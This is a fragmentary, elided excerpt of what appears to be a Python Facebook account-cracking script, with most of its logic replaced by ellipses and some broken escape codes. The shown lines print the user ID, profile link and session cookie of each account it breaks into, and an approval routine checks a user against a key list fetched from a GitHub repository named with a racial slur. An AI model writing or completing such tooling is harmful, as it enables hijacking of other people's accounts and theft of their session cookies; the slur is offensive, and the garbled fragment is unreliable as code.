...
import os,json
import os,time,zlib
print('\33[1;37\33[1m need approved lol')
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Uid user] '+ids+'\033[1;97m')
                                        ...
                                        print('\r\r\033[1;38m [Date]'+asha(ids)+'\033[1;97m')
                                        print("\r\r\033[1;33m \033[0;34m[FBLINK]: https://www.facebook.com/"+ids)
                                        print("\r\r\033[1;37m 🍪:\033[1;33"+coki)
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/zykieawur/nigga/blob/main/key.txt").text
    if id in httpCaht:
